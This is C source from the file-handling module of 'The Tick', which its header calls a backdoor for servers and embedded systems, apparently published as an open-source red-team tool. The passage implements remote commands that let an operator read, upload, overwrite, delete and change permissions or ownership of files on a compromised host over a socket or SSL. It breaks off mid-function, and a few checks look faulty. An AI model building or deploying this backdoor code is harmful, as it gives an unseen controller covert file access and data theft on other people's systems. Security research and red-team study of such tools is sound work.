/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

// Try to get the definitions of lstat() and readlink() included.
// We must do this before any other headers are included.
// If in the future this fails for some weird platform,
// we could alias lstat() to stat() here instead.
#ifndef _WIN32
# define _BSD_SOURCE
# define _DEFAULT_SOURCE
# define _XOPEN_SOURCE 500
# define _POSIX_C_SOURCE 200112L
# define __USE_XOPEN_EXTENDED
# include <sys/stat.h>
#endif

#ifdef _WIN32

// Used in the time conversion routine.
#define WINDOWS_TICK 10000000
#define SEC_TO_UNIX_EPOCH 11644473600LL

// Used in the emulation of stat().
#define	S_IFMT      0170000
#define	S_IFDIR     0040000
#define	S_IFCHR     0020000
#define	S_IFBLK     0060000
#define	S_IFREG     0100000
#define	S_IFIFO     0010000
#define	S_IFLNK     0120000
#define	S_IFSOCK    0140000
#define	S_ISUID     04000
#define	S_ISGID     02000
#define	S_ISVTX     01000
#define	S_IREAD     0400
#define	S_IWRITE    0200
#define	S_IEXEC     0100

// Used to create symlinks.
#ifndef SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE
#define SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE 2
#endif

#endif

#include "file.h"

#include "stream.h"

#ifdef _WIN32

// https://stackoverflow.com/a/109025/426293
int numberOfSetBits(uint32_t i)
{
    i = i - ((i >> 1) & 0x55555555);
    i = (i & 0x33333333) + ((i >> 2) & 0x33333333);
    return (((i + (i >> 4)) & 0x0F0F0F0F) * 0x01010101) >> 24;
}

// https://stackoverflow.com/a/523737/426293
#define CHECK_BIT(var,pos) ((var) & (1<<(pos)))

char *fake_to_real_path(const char *fake)
{
    if (memcmp(fake, "/drive/", 7) != 0 ||
        (fake[8] != '/' && fake[8] != 0) ||
        ! ((fake[7] >= 'a' && fake[7] <= 'z') ||
        (fake[7] >= 'A' && fake[7] <= 'Z'))
    ) {
        return NULL;
    }
    HANDLE hHeap = GetProcessHeap();
    DWORD dwSize = strlen(fake);    // intentional extra space
    char *real = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSize);
    if (real == NULL) return NULL;
    real[0] = fake[7] & 0x5f;       // crude uppercase
    real[1] = ':';
    real[2] = '\\';
    if (fake[8] != 0) {
        memcpy(real + 2, fake + 8, dwSize - 8);
        unsigned int i;
        for (i = 0; i < dwSize; i++) {
            if (real[i] == '/') {
                real[i] = '\\';
            }
        }
    }
    LOG("Got fake path: %s\n", fake);
    LOG("Converted to real path: %s\n", real);
    return real;
}

char *real_to_fake_path(const char *real)
{
    HANDLE hHeap = GetProcessHeap();
    DWORD dwSize = GetFullPathNameA(real, 0, NULL, NULL);
    if (dwSize == 0) return NULL;
    char *fake = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSize + 8);
    if (fake == NULL) return NULL;
    memcpy(fake, "/drive/", 7);
    if (GetFullPathNameA(real, dwSize, fake + 7, NULL) == 0) {
        HeapFree(hHeap, 0, fake);
        return NULL;
    }
    if (((fake[7] >= 'a' && fake[7] <= 'z') ||
        (fake[7] >= 'A' && fake[7] <= 'Z')) && fake[8] == ':') {
        fake[8] = '/';
    } else {
        HeapFree(hHeap, 0, fake);
        return NULL;
    }
    unsigned int i;
    for (i = 7; i < dwSize + 7; i++) {
        if (fake[i] == '\\') {
            fake[i] = '/';
        }
    }
    LOG("Got real path: %s\n", real);
    LOG("Converted to fake path: %s\n", fake);
    return fake;
}

void free_path(const char *path)
{
    if (path != NULL) {
        HeapFree(GetProcessHeap(), 0, (void *) path);
    }
}

#endif

//////////////////////////////////////////////////////////////////////////////
// Basic file commands
// Added since v0.1

void real_file_pull(Parser *p, size_t size, off_t offset, int strict_size);
void real_file_push(Parser *p, off_t offset, int is_new);

// Implements the "pull" command.
void do_file_pull(Parser *p)
{
    real_file_pull(p, 0, 0, 1);
}

// Helper function for reading a file.
// This is shared by the "pull" and "read" commands.
void real_file_pull(Parser *p, size_t size, off_t offset, int strict_size)
{
    // Get the filename into the parser's internal buffer.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    char *filename = p->buffer;

#ifdef _WIN32
    char *real = fake_to_real_path(filename);
    if (real != NULL) filename = real;
#endif

    // Make sure we have read access to the file.
    if (access(filename, F_OK) == -1) {
        LOG("Cannot find %s\n", filename);
        parser_error(p, "file not found");
#ifdef _WIN32
        free_path(real);
#endif
        return;
    }
    if (access(filename, R_OK) == -1) {
        LOG("Cannot read %s\n", filename);
        parser_error(p, "file not readable");
#ifdef _WIN32
        free_path(real);
#endif
        return;
    }

    // If the size to read is 0, bring the whole file.
    // If the size to read is greater than the file size,
    // don't try to read past the end of the file.
    // If the size is larger than what we can send in a
    // single packet, truncate the size.
    struct stat info;
    info.st_size = 0;
    stat(filename, &info);
    if (size == 0 || size > (size_t) info.st_size) {
        size = (size_t) info.st_size;
    }
    if (size > (off_t) 0x7FFFFFFF) {
        if (strict_size) {
            LOG("File is too big to fit in a single response!\n");
            parser_error(p, "file too large");
#ifdef _WIN32
            free_path(real);
#endif
            return;
        }
        size = 0x7FFFFFFF;
    }

    // If the file is empty, just return now.
    // No point in reading 0 bytes.
    if (size == 0) {
        parser_ok(p);
#ifdef _WIN32
        free_path(real);
#endif
        return;
    }

    // Open the file.
    int file = open(filename, O_RDONLY | O_BINARY | O_SEQUENTIAL);
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
#ifdef _WIN32
        free_path(real);
#endif
        return;
    }

    // Move the file pointer to the desired offset.
    if (offset != 0 && lseek(file, offset, SEEK_SET) < 0) {
        LOG("Error seeking offset %ld in %s\n", (long int) offset, filename);
        parser_error(p, "cannot seek");
        close(file);
#ifdef _WIN32
        free_path(real);
#endif
        return;
    }

    // Send the file in the response.
    // Close the connection if something goes wrong at this point.
    LOG("Reading %ld bytes from offset %ld of file %s\n", (long int) size, (long int) offset, filename);
    parser_begin_response(p, CMD_STATUS_OK, size);
    int success = 0;
#if TICK_FEATURES_CRYPTO
    if (p->use_ssl) {
        success = copy_stream(file, STREAM_FD, (STREAM_T) &p->ssl, STREAM_SSL, size);
    } else {
        success = copy_stream(file, STREAM_FD, p->fd, STREAM_SOCKET, size);
    }
#else
    success = copy_stream(file, STREAM_FD, p->fd, STREAM_SOCKET, size);
#endif
    if (success < 0) {
        parser_close(p);
        LOG("Error sending file\n");
    } else {
        LOG("Success\n");
    }
    close(file);
#ifdef _WIN32
    free_path(real);
#endif
}

// Implements the "push" command.
void do_file_push(Parser *p)
{
    real_file_push(p, 0, 1);
}

// Helper function for writing a file.
// This is shared by the "push" and "write" commands.
void real_file_push(Parser *p, off_t offset, int is_new)
{
    int file = -1;
    int success = -1;
    char *filename = p->buffer;

    // Get the filename into the parser's internal buffer.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

#ifdef _WIN32
    char *real = fake_to_real_path(filename);
    if (real != NULL) filename = real;
#endif

    // Open the file for writing.
    // If the file is new, fix the mode (in case umask is messing with us).
    if (is_new) {
        file = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC | O_BINARY | O_SEQUENTIAL, 0777);
        chmod(filename, 0777);
    } else {
        file = open(filename, O_WRONLY | O_SYNC | O_BINARY | O_SEQUENTIAL);
    }
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
#ifdef _WIN32
        free_path(real);
#endif
        return;
    }

    // Move the file pointer to the desired offset.
    if (offset != 0 && lseek(file, offset, SEEK_SET) < 0) {
        LOG("Error seeking offset %ld in %s\n", (long int) offset, filename);
        parser_error(p, "cannot seek");
        close(file);
#ifdef _WIN32
        free_path(real);
#endif
        return;
    }

    // Save the file data as it comes from the socket.
    LOG("Writing %ld bytes at offset %ld of file %s\n", (long int) p->header.data_len, (long int) offset, filename);
#if TICK_FEATURES_CRYPTO
    if (p->use_ssl) {
        success = copy_stream((STREAM_T) &p->ssl, STREAM_SSL, file, STREAM_FD, p->header.data_len);
    } else {
        success = copy_stream(p->fd, STREAM_SOCKET, file, STREAM_FD, p->header.data_len);
    }
#else
    success = copy_stream(p->fd, STREAM_SOCKET, file, STREAM_FD, p->header.data_len);
#endif

    // Flush the file cache to make sure the data is written to disk.
    // No need to check for errors on this operation.
#ifdef _WIN32
    FlushFileBuffers((HANDLE) _get_osfhandle(file));
#else
    fsync(file);
#endif

    // Close the file and return.
    close(file);
    if (success < 0) {
        LOG("Error receiving file\n");
        parser_error(p, "failed to write file");
        parser_close(p);
    } else {
        LOG("Success\n");
        parser_ok(p);
    }
    p->header.data_len = 0;     // Make sure to reset this counter!
#ifdef _WIN32
    free_path(real);
#endif
}

// Implements the "rm" command.
// Also be used by the FUSE layer since v0.2.
void do_file_unlink(Parser *p)
{
    char *filename = p->buffer;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

#ifdef _WIN32
    char *real = fake_to_real_path(filename);
    if (real != NULL) filename = real;
#endif

    // Delete the file.
    if (unlink(filename) < 0) {
        LOG("Error deleting file %s\n", filename);
        parser_error(p, "could not delete");
    } else {
        LOG("Deleted file %s\n", filename);
        parser_ok(p);
    }

#ifdef _WIN32
    free_path(real);
#endif
}

// Implements the "chmod" command.
// Also be used by the FUSE layer since v0.2.
void do_file_chmod(Parser *p)
{
    char *filename = p->buffer;
    uint16_t mode = 0;

    // First two bytes of the first argument are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    if (parser_recv_block(p, (char *) &mode, sizeof(mode)) < 0) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

#ifdef _WIN32
    if (strcmp(filename, "/drive") == 0 || strcmp(filename, "/drive/") == 0) {
        parser_error(p, "could not chmod");
        return;
    }
    char *real = fake_to_real_path(filename);
    if (real != NULL) filename = real;
#endif

    // Chmod the file.
    if (chmod(filename, mode) < 0) {
        LOG("Error changing file mode to %03o %s\n", mode, filename);
        parser_error(p, "could not chmod");
    } else {
        LOG("Changed file mode to %03o %s\n", mode, filename);
        parser_ok(p);
    }

#ifdef _WIN32
    free_path(real);
#endif
}

//////////////////////////////////////////////////////////////////////////////
// FUSE methods
// Added since v0.2

void do_file_open(Parser *p)
{
    char *filename = p->buffer;
    uint16_t flags = 0;
    uint16_t mode = 0;
    uint16_t error = 0;

    // First two bytes are the open flags in network byte order.
    // Second two bytes are the mode flags in network byte order.
    // The following bytes are the filename.
    if (
        (p->header.cmd_len < sizeof(flags) + sizeof(mode) + 2) ||
        (parser_recv_block(p, (char *) &flags, sizeof(flags)) < 0) ||
        (parser_recv_block(p, (char *) &mode, sizeof(mode)) < 0)
    ) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - (sizeof(flags) + sizeof(mode));
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    flags = ntohs(flags);
    mode = ntohs(mode);

#ifdef _WIN32
    char *real = fake_to_real_path(filename);
    if (real != NULL) filename = real;
#endif

    // Open the file and close it immediately.
    // We don't need to preserve the open file descriptor, since each function will
    // just open the file again. This is why we only support a subset of flags,
    // we don't want any unintended consequences from this. (Also, the values of
    // the flags themselves are often not portable, except for the oldest ones).
    flags &= O_RDONLY | O_WRONLY | O_RDWR | O_CREAT | O_TRUNC | O_EXCL;
    int fd = open(filename, flags, mode);
    if (fd < 0) {
        error = errno;
    } else {
        close(fd);
        error = 0;
    }

    // Return 0 on success or the error code or 0 on failure.
    // This plays better with FUSE since we can return a proper
    // error code to it rather than having to parse strings.
    LOG("Open call on file %s, error code %d\n", filename, error);
    error = htons(error);
    parser_begin_response(p, CMD_STATUS_OK, 2);
    parser_send_block(p, (char *) &error, 2);

#ifdef _WIN32
    free_path(real);
#endif
}

void do_file_read(Parser *p)
{
    uint32_t size = 0;
    uint64_t offset = 0;

    // First dword is the size in network byte order.
    // Second qword is the offset in network byte order.
    // The following bytes are the filename.
    if (
        (p->header.cmd_len < sizeof(size) + sizeof(offset) + 2) ||
        (parser_recv_block(p, (char *) &size, sizeof(size)) < 0) ||
        (parser_recv_block(p, (char *) &offset, sizeof(offset)) < 0)
    ) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - (sizeof(size) + sizeof(offset));
    size = ntohl(size);
    offset = ntohll(offset);

    // Respond with the requested file contents.
    real_file_pull(p, size, offset, 0);
}

void do_file_write(Parser *p)
{
    uint64_t offset = 0;

    // First four bytes are the offset in network byte order.
    // The following bytes are the filename.
    if (
        (p->header.cmd_len < sizeof(offset) + 2) ||
        (parser_recv_block(p, (char *) &offset, sizeof(offset)) < 0)
    ) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - (sizeof(offset));
    offset = ntohll(offset);

    // Write the incoming file contents to the file.
    real_file_push(p, offset, 0);
}

void do_file_stat(Parser *p)
{
    char *filename = p->buffer;
    RESP_FILE_STAT mystat;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

#ifdef _WIN32

    // Fake to real path conversion.
    char *real = NULL;
    if (strcmp(filename, "/drive") == 0 || strcmp(filename, "/drive/") == 0) {
        real = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4);
        if (real == NULL) {
            parser_error(p, "internal error");
            return;
        }
        memcpy(real, "C:\\", 4);
        filename = real;
    } else {
        real = fake_to_real_path(filename);
        if (real != NULL) filename = real;
    }

    // Stat the file.
    struct __stat64 st;
    memset(&st, 0, sizeof(st));
    if (_stat64(filename, &st) < 0) {
        LOG("Cannot stat: %s\n", filename);
        parser_error(p, "cannot stat");
        free_path(real);
        return;
    }

#else

    // Stat the file.
    struct stat st;
    memset(&st, 0, sizeof(st));
    if (lstat(filename, &st) < 0) {
        LOG("Cannot stat: %s\n", filename);
        parser_error(p, "cannot stat");
        return;
    }

#endif

    // Convert the native stat structure to RESP_FILE_STAT.
    // We need this to ensure it stays the same across platforms.
    // All values will be converted to network byte size order.
    // (Hopefully the values themselves are more or less portable...)
    memset(&mystat, 0, sizeof(mystat));
    mystat.dev = htonll(st.st_dev);
    mystat.ino = htonll(st.st_ino);
    mystat.mode = htonll(st.st_mode);
    mystat.nlink = htonll(st.st_nlink);
    mystat.uid = htonll(st.st_uid);
    mystat.gid = htonll(st.st_gid);
    mystat.rdev = htonll(st.st_rdev);
    mystat.size = htonll(st.st_size);
    mystat.atime = htonll(st.st_atime);
    mystat.mtime = htonll(st.st_mtime);
    mystat.ctime = htonll(st.st_ctime);

    LOG("Stat call on: %s\n", filename);
    parser_begin_response(p, CMD_STATUS_OK, sizeof(mystat));
    parser_send_block(p, (char *) &mystat, sizeof(mystat));

#ifdef _WIN32
    free_path(real);
#endif
}

// This one is tricky because we need to count the number of entries first,
// then send the entries later. We're inevitably going to have some race
// conditions. The "solution" here will be to, if we miss the calculation
// somehow, just skip some extra entries if we run out of buffer space for
// the new filenames. Far from perfect, but it is what it is.
void do_file_readdir(Parser *p)
{
    // Get the pathname (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    char *pathname = p->buffer;
    unsigned int count = 0;
    size_t resp_size = 0;

    LOG("Listing directory: %s\n", pathname);

#ifdef _WIN32

    // Our fake paths have the format: /drive/C/Windows/system32
    // That means we can simply convert a full path, but we have to
    // completely fake the response for "/" and "/drive".
    if (pathname[0] == '/' && pathname[1] == 0) {
        // . .. drive
        parser_begin_response(p, CMD_STATUS_OK, 11);
        parser_send_block(p, ".\0..\0drive\0", 11);
    } else if (strcmp(pathname, "/drive") == 0 || strcmp(pathname, "/drive/") == 0) {
        DWORD dwLogicalDrives = GetLogicalDrives();
        count = numberOfSetBits(dwLogicalDrives);
        parser_begin_response(p, CMD_STATUS_OK, count * 2);
        unsigned int bit;
        for (bit = 0; bit < 32; bit++) {
            if (CHECK_BIT(dwLogicalDrives, bit)) {
                char letter[2] = {'A' + bit , 0};
                parser_send_block(p, letter, 2);
            }
        }
    } else {
        char *real = fake_to_real_path(pathname);
        if (real != NULL) {
            if (real[strlen(real)-1] == '\\') {
                strcat(real, "*.*");
            } else {
                strcat(real, "\\*.*");
            }
            pathname = real;
        }

        // Iterate once to calculate the size of the response.
        WIN32_FIND_DATAA fd;
        memset(&fd, 0, sizeof(fd));
        HANDLE hFind = FindFirstFileA(pathname, &fd);
        if (hFind == INVALID_HANDLE_VALUE) {
            LOG("Error listing directory: %s\n", pathname);
            parser_error(p, "cannot opendir");
            free_path(real);
            return;
        }
        for (;;) {
            resp_size += strlen(fd.cFileName) + 1;
            count++;
            if (FindNextFile(hFind, &fd) == 0) break;
        }
        FindClose(hFind);

        // Iterate again to send the filenames.
        // Stop early if we ran out of space in the response.
        memset(&fd, 0, sizeof(fd));
        hFind = FindFirstFileA(pathname, &fd);
        if (hFind == INVALID_HANDLE_VALUE) {
            LOG("Error listing directory: %s\n", pathname);
            parser_error(p, "cannot opendir");
            free_path(real);
            return;
        }
        parser_begin_response(p, CMD_STATUS_OK, resp_size);
        while (resp_size > 0) {
            size_t len = strlen(fd.cFileName) + 1;
            if (resp_size >= len) {
                parser_send_block(p, fd.cFileName, len);
                resp_size -= len;
            }
            if (FindNextFile(hFind, &fd) == 0) break;
        }
        FindClose(hFind);
        free_path(real);
    }

#else

    // Iterate once to calculate the size of the response.
    DIR *dir = opendir(pathname);
    if (dir == NULL) {
        LOG("Error listing directory: %s\n", pathname);
        parser_error(p, "cannot opendir");
        return;
    }
    for (;;) {
        struct dirent *entry = readdir(dir);
        if (entry == NULL) break;
        resp_size += strlen(entry->d_name) + 1;
        count++;
    }
    closedir(dir);

    // Iterate again to send the filenames.
    // Stop early if we ran out of space in the response.
    dir = opendir(pathname);
    if (dir == NULL) {
        LOG("Error listing directory: %s\n", pathname);
        parser_error(p, "cannot opendir");
        return;
    }
    parser_begin_response(p, CMD_STATUS_OK, resp_size);
    for (;;) {
        struct dirent *entry = readdir(dir);
        if (entry == NULL) break;
        size_t len = strlen(entry->d_name) + 1;
        if (resp_size >= len) {
            parser_send_block(p, entry->d_name, len);
            resp_size -= len;
        }
    }
    closedir(dir);

#endif

    // Pad the response if needed.
    if (resp_size > 0) {
        char c = 0;
        parser_send_block(p, &c, 1);
        resp_size--;
    }

    // Log the event.
    LOG("Found %d files\n", count);
}

void do_file_readlink(Parser *p)
{
    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    char *filename = p->buffer;
#ifdef _WIN32
    char *real = fake_to_real_path(filename);
    if (real != NULL) filename = real;
#endif
    LOG("Resolving symlink: %s\n", filename);

#ifdef _WIN32

    // On Windows we don't have a readlink() equivalent.
    // But we do have a realpath() equivalent.
    // Sadly this only works for files.
    HANDLE hFile = CreateFileA(
            filename, 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG("Error resolving symlink: %s\n", filename);
        parser_error(p, "cannot readlink");
        free_path(real);
        return;
    }

    // Hack: we use the input buffer as the output buffer.
    memset(p->buffer, 0, sizeof(p->buffer));
    size_t len = GetFinalPathNameByHandleA(hFile, p->buffer, sizeof(p->buffer), 0);
    CloseHandle(hFile);

    // Check for error condition.
    if (len == 0 || len > sizeof(p->buffer)) {
        LOG("Error resolving symlink: %s\n", filename);
        parser_error(p, "cannot readlink");
        free_path(real);
        return;
    }

    // Fix the size on some Windows versions.
    len = strlen(p->buffer) + 1;

    // If we got a fake path in, we return a fake path out.
    char *output = p->buffer;
    char *fake = NULL;
    if (real != NULL) {
        fake = real_to_fake_path(p->buffer);
        if (fake != NULL) {
            output = fake;
            len = strlen(fake) + 1;
        }
    }

#else

    // Hack: we use the input buffer as the output buffer.
    ssize_t len = readlink(filename, p->buffer, sizeof(p->buffer) - 1);
    p->buffer[len++] = 0;
    char *output = p->buffer;

#endif
    LOG("Resolved symlink to: %s\n", output);
    parser_begin_response(p, CMD_STATUS_OK, len);
    parser_send_block(p, output, len);

#ifdef _WIN32
    free_path(real);
    free_path(fake);
#endif
}

#ifdef _WIN32

void do_file_symlink(Parser *p)
{
    char target_buff[256];
    char linkname_buff[256];

    // Get the target filename (first argument).
    if (parser_get_first_arg(p) < 0 || strlen(p->buffer) > (sizeof(target_buff) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(target_buff, p->buffer, sizeof(target_buff) - 1);
    if (strcmp(target_buff, "/") == 0 || strcmp(target_buff, "/drive") == 0 || strcmp(target_buff, "/drive/") == 0) {
        parser_error(p, "cannot link");
        return;
    }

    // Get the linkname filename (second argument).
    if (parser_get_second_arg(p) < 0 || strlen(p->buffer) > (sizeof(linkname_buff) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(linkname_buff, p->buffer, sizeof(linkname_buff) - 1);
    if (strcmp(linkname_buff, "/") == 0 || strcmp(linkname_buff, "/drive") == 0 || strcmp(linkname_buff, "/drive/") == 0) {
        parser_error(p, "cannot link");
        return;
    }

    // Convert the fake paths to real paths.
    char *target = fake_to_real_path(target_buff);
    char *linkname = fake_to_real_path(linkname_buff);
    if (target == NULL) target = target_buff;
    if (linkname == NULL) target = linkname_buff;

    // We have to tell the Win32 API if it's a directory or not.
    // On Unix that's not necessary.
    DWORD dwAttrib = GetFileAttributesA(target);
    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
        LOG("Cannot create symlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
        if (target != target_buff) free_path(target);
        if (linkname != linkname_buff) free_path(linkname);
        return;
    }

    // Create the symlink.
    if (CreateSymbolicLinkA(linkname, target,
        (dwAttrib & FILE_ATTRIBUTE_DIRECTORY ? SYMBOLIC_LINK_FLAG_DIRECTORY : 0) ||
        SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE) == 0)
    {
        LOG("Cannot create symlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
    } else {
        LOG("Created symlink %s -> %s\n", linkname, target);
        parser_ok(p);
    }

    if (target != target_buff) free_path(target);
    if (linkname != linkname_buff) free_path(linkname);
}

void do_file_link(Parser *p)
{
    char target_buff[256];
    char linkname_buff[256];

    // Get the target filename (first argument).
    if (parser_get_first_arg(p) < 0 || strlen(p->buffer) > (sizeof(target_buff) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(target_buff, p->buffer, sizeof(target_buff) - 1);
    if (strcmp(target_buff, "/") == 0 || strcmp(target_buff, "/drive") == 0 || strcmp(target_buff, "/drive/") == 0) {
        parser_error(p, "cannot link");
        return;
    }

    // Get the linkname filename (second argument).
    if (parser_get_second_arg(p) < 0 || strlen(p->buffer) > (sizeof(linkname_buff) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(linkname_buff, p->buffer, sizeof(linkname_buff) - 1);
    if (strcmp(linkname_buff, "/") == 0 || strcmp(linkname_buff, "/drive") == 0 || strcmp(linkname_buff, "/drive/") == 0) {
        parser_error(p, "cannot link");
        return;
    }

    // Convert the fake paths to real paths.
    char *target = fake_to_real_path(target_buff);
    char *linkname = fake_to_real_path(linkname_buff);
    if (target == NULL) target = target_buff;
    if (linkname == NULL) target = linkname_buff;

    // Create the hardlink.
    if (CreateHardLinkA(linkname, target, NULL) == 0) {
        LOG("Cannot create hardlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
    } else {
        LOG("Created hardlink %s -> %s\n", linkname, target);
        parser_ok(p);
    }
    if (target != target_buff) free_path(target);
    if (linkname != linkname_buff) free_path(linkname);
}

#else

void do_file_symlink(Parser *p)
{
    char target[256];
    char linkname[256];

    // Get the target filename (first argument).
    if (parser_get_first_arg(p) < 0 || strlen(p->buffer) > (sizeof(target) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(target, p->buffer, sizeof(target) - 1);

    // Get the linkname filename (second argument).
    if (parser_get_second_arg(p) < 0 || strlen(p->buffer) > (sizeof(linkname) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(linkname, p->buffer, sizeof(linkname) - 1);

    // Create the symlink.
    if (symlink(target, linkname) < 0) {
        LOG("Cannot create symlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
        return;
    }

    // Success.
    LOG("Created symlink %s -> %s\n", linkname, target);
    parser_ok(p);
}

void do_file_link(Parser *p)
{
    char target[256];
    char linkname[256];

    // Get the target filename (first argument).
    if (parser_get_first_arg(p) < 0 || strlen(p->buffer) > (sizeof(target) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(target, p->buffer, sizeof(target) - 1);

    // Get the linkname filename (second argument).
    if (parser_get_second_arg(p) < 0 || strlen(p->buffer) > (sizeof(linkname) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(linkname, p->buffer, sizeof(linkname) - 1);

    // Create the hardlink.
    if (link(target, linkname) < 0) {
        LOG("Cannot create hardlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
        return;
    }

    // Success.
    LOG("Created hardlink %s -> %s\n", linkname, target);
    parser_ok(p);
}

#endif

void do_file_rmdir(Parser *p)
{
    char *pathname = p->buffer;

    // Get the pathname (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

#ifdef _WIN32
    if (strcmp(pathname, "/") == 0 || strcmp(pathname, "/drive") == 0 || strcmp(pathname, "/drive/") == 0) {
        parser_error(p, "could not delete");
        return;
    }
    char *real = fake_to_real_path(pathname);
    if (real != NULL) pathname = real;
#endif

    // Delete the directory.
    if (rmdir(pathname) < 0) {
        LOG("Error deleting directory %s\n", pathname);
        parser_error(p, "could not delete");
    } else {
        LOG("Deleted directory %s\n", pathname);
        parser_ok(p);
    }

#ifdef _WIN32
    free_path(real);
#endif
}

void do_file_mkdir(Parser *p)
{
    char *pathname = p->buffer;
    uint16_t mode = 0;

    // First two bytes are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    if (parser_recv_block(p, (char *) &mode, sizeof(mode)) < 0) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the pathname.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

#ifdef _WIN32
    if (strcmp(pathname, "/") == 0 || strcmp(pathname, "/drive") == 0 || strcmp(pathname, "/drive/") == 0) {
        parser_error(p, "could not mkdir");
        return;
    }
    char *real = fake_to_real_path(pathname);
    if (real != NULL) pathname = real;
#endif

    // Create the directory.
    int success = 0;
#ifdef _WIN32
    success = mkdir(pathname);
#else
    success = mkdir(pathname, mode);
#endif
    if (success < 0) {
        LOG("Error creating directory %s\n", pathname);
        parser_error(p, "could not mkdir");
    } else {
        LOG("Created directory %s\n", pathname);
        parser_ok(p);
    }

#ifdef _WIN32
    free_path(real);
#endif
}

#ifdef _WIN32
void do_file_chown(Parser *p)
{
    parser_error(p, "not implemented");
}
#else
void do_file_chown(Parser *p)
{
    char *filename = p->buffer;
    uint64_t uid = 0;
    uint64_t gid = 0;

    // First 16 bytes are the uid and gid in network byte order.
    if ((p->header.cmd_len < 16) &&
        (parser_recv_block(p, (char *) &uid, 8) < 0) &&
        (parser_recv_block(p, (char *) &gid, 8) < 0)
    )
    {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - 16;
    uid = ntohl(uid);
    gid = ntohl(gid);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Chown the file.
    if (chown(filename, uid, gid) < 0) {
        LOG("Error changing file ownership to %ld:%ld for: %s\n", (long int) uid, (long int) gid, filename);
        parser_error(p, "could not chown");
    } else {
        LOG("Changed file ownership to %ld:%ld for: %s\n", (long int) uid, (long int) gid, filename);
        parser_ok(p);
    }
}
#endif

void do_file_access(Parser *p)
{
    char *filename = p->buffer;
    uint16_t mode = 0;

    // First two bytes of the first argument are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    if (parser_recv_block(p, (char *) &mode, sizeof(mode)) < 0) {
        LOG("Malformed command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

#ifdef _WIN32
